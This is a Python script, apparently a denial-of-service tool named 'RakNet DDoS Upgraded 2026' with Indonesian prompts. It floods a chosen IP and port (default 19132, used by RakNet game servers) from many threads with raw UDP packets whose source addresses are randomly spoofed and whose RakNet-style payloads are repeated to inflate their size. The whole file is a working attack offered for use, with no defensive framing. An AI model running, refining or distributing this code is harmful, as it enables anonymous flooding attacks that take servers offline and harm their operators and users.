import socket
import time
import random
import threading
import struct
import os

# ================== RAKNET PAYLOAD VARIANTS 2026 ==================
RAKNET_PAYLOADS = [
    b'\x02\x01\x02\x4D\xFF\xFF\x00\x00\xDD\x00\xFF\xFF\x00\xFE\xFE\xFE\xFE\xFD\xFD\xFD\xFD\x12\x34\x56\x78',  # Classic
    b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # Unconnected Ping
    b'\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # OpenNAT
    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # Empty probe
    bytes([random.randint(0,255) for _ in range(64)])  # Random junk
]

def get_random_payload():
    payload = random.choice(RAKNET_PAYLOADS)
    # Amplify size
    multiplier = random.randint(8, 32)
    return payload * multiplier

def spoofed_send(target_ip, target_port, duration, thread_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(f"[Thread {thread_id}] Butuh ROOT untuk IP Spoofing! Jalankan dengan tsu/sudo.")
        return
    except Exception as e:
        print(f"[Thread {thread_id}] Socket error: {e}")
        return

    end_time = time.time() + duration
    packets_sent = 0

    while time.time() < end_time:
        try:
            src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            src_port = random.randint(1024, 65535)
            
            payload = get_random_payload()
            packet_size = len(payload)
            
            # Build fake IP + UDP header + payload
            ip_header = struct.pack('!BBHHHBBH4s4s', 
                0x45, 0, packet_size + 28, 0, 0, 255, socket.IPPROTO_UDP, 0, 
                socket.inet_aton(src_ip), socket.inet_aton(target_ip))
            
            udp_header = struct.pack('!HHHH', src_port, target_port, packet_size + 8, 0)
            
            full_packet = ip_header + udp_header + payload
            
            sock.sendto(full_packet, (target_ip, target_port))
            packets_sent += 1
            
            if packets_sent % 500 == 0:
                print(f"[Thread {thread_id}] Sent {packets_sent} packets | Size: {packet_size} bytes")
                
        except Exception:
            time.sleep(0.001)  # Avoid CPU overload

    print(f"[Thread {thread_id}] Finished. Total packets: {packets_sent}")

def main():
    print("=== RakNet DDoS Upgraded 2026 - 𝗟𝗔𝗜𝗡𝗨𝗫𝗥𝗤 Edition ===\n")
    
    target_ip = input("Masukkan IP target: ")
    target_port = int(input("Masukkan port target (default RakNet 19132): ") or 19132)
    duration = int(input("Durasi serangan (detik): ") or 60)
    threads_count = int(input("Jumlah threads (50-500 direkomendasikan): ") or 200)

    print(f"\nMenyerang {target_ip}:{target_port} dengan {threads_count} threads selama {duration} detik...")
    print("Pastikan script dijalankan sebagai ROOT!\n")

    threads = []
    for i in range(threads_count):
        t = threading.Thread(target=spoofed_send, args=(target_ip, target_port, duration, i+1), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.01)  # Stagger start

    try:
        while any(t.is_alive() for t in threads):
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nSerangan dihentikan manual.")

    print("Serangan selesai.")

if __name__ == "__main__":
    # Cek root
    if os.geteuid() != 0:
        print("ERROR: Script ini butuh ROOT untuk IP Spoofing.")
        print("Di Termux jalankan: tsu")
        print("Kemudian jalankan script lagi.")
    else:
        main()
